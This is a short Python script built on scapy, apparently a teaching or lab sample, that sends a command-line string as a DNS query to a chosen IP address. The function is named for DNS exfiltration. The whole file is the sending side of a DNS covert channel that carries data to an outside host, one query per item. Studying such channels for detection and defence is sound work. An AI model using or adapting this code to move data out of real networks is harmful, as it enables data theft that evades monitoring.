import sys
from scapy.all import *

def dns_exfiltration_send(ip_dst, letter):
    packet = IP(dst=ip_dst) / UDP(dport=53) /DNS(rd=1,qd=DNSQR(qname=letter))

    send(packet)

if __name__ == "__main__":
    ip_dst = sys.argv[1]
    letter = sys.argv[2]
    dns_exfiltration_send(ip_dst, letter)